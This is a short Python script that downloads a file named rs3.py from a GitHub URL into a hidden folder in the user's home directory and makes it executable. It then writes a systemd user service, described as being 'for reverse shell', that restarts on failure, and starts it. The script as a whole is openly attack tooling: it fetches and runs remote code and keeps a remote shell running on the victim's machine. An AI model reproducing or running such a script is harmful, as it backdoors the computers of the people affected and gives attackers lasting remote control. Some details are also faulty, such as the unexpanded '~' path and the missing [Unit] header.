import shutil
import os
import getpass
from stat import *

import urllib.request
USERNAME = getpass.getuser()

RS3 = "https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py"

urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")

os.chmod(f"/home/{USERNAME}/.rshell/rs3.py",0o777)

unit_file = open("~/.config/systemd/user/rs.service","w")
unit_file.write(f"""
Description= Unit file for reverse shell.

Wants=network.target
After=syslog.target network-online.target

[Service]
Type=simple
ExecStart=/home/{USERNAME}/.rshell/./rs3.py
Restart=on-failure
RestartSec=10
KillMode=process

[Install]
WantedBy=multi-user.target""")

unit_file.close()
os.system("systemctl --user start rs.service")
